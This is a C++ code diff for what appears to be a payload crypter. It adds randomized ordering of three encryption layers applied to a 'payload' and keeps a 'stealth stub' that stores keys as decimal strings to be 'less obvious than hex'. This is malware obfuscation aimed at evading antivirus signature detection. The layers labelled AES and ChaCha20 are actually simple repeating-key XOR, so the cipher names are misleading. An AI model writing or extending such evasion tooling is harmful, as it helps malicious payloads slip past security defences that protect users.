@@ -204,6 +204,7 @@ public:
         uint8_t chachaNonce[12];
         uint8_t xorKey[32];
         size_t xorKeyLen;
+        int encryptionOrder[3]; // 0=AES, 1=ChaCha20, 2=XOR
     };
     
     // Generate keys with maximum entropy
@@ -227,7 +228,38 @@ public:
             keys.xorKey[i] = dist(rng);
         }
         
+        // Randomize encryption order
+        keys.encryptionOrder[0] = 0; // AES
+        keys.encryptionOrder[1] = 1; // ChaCha20
+        keys.encryptionOrder[2] = 2; // XOR
+        
+        // Fisher-Yates shuffle
+        for (int i = 2; i > 0; i--) {
+            std::uniform_int_distribution<> shuffleDist(0, i);
+            int j = shuffleDist(rng);
+            std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
+        }
+        
         return keys;
+    }
+    
+    // Apply encryption layer
+    void applyEncryptionLayer(std::vector<uint8_t>& data, int method, const TripleKey& keys) {
+        switch (method) {
+            case 0: // AES (simplified)
+                for (size_t i = 0; i < data.size(); i++) {
+                    data[i] ^= keys.aesKey[i % 16];
+                }
+                break;
+            case 1: // ChaCha20 (simplified)
+                for (size_t i = 0; i < data.size(); i++) {
+                    data[i] ^= keys.chachaKey[i % 32];
+                }
+                break;
+            case 2: // XOR
+                xorData(data.data(), data.size(), keys.xorKey, keys.xorKeyLen);
+                break;
+        }
     }
     
     // Generate stealth stub that stores keys as decimal numbers
@@ -237,17 +269,9 @@ public:
         // Encrypt payload with triple layer
         std::vector<uint8_t> encrypted = payload;
         
-        // Layer 1: XOR
-        xorData(encrypted.data(), encrypted.size(), keys.xorKey, keys.xorKeyLen);
-        
-        // Layer 2: ChaCha20 (simplified)
-        for (size_t i = 0; i < encrypted.size(); i++) {
-            encrypted[i] ^= keys.chachaKey[i % 32];
-        }
-        
-        // Layer 3: AES (simplified)
-        for (size_t i = 0; i < encrypted.size(); i++) {
-            encrypted[i] ^= keys.aesKey[i % 16];
+        // Apply encryption layers in randomized order
+        for (int i = 0; i < 3; ++i) {
+            applyEncryptionLayer(encrypted, keys.encryptionOrder[i], keys);
         }
         
         // Convert keys to decimal strings (less obvious than hex)
@@ -401,17 +425,9 @@ std::vector<uint8_t> decToBytes(const std::string& dec, size_t len) {
         // Generate keys
         TripleKey keys = generateKeys();
         
-        // Triple encryption
-        xorData(data.data(), data.size(), keys.xorKey, keys.xorKeyLen);
-        
-        // Simplified ChaCha20
-        for (size_t i = 0; i < data.size(); i++) {
-            data[i] ^= keys.chachaKey[i % 32];
-        }
-        
-        // Simplified AES
-        for (size_t i = 0; i < data.size(); i++) {
-            data[i] ^= keys.aesKey[i % 16];
+        // Apply encryption layers in randomized order
+        for (int i = 0; i < 3; ++i) {
+            applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
         }
         
         // Write encrypted file (just the data, no headers)
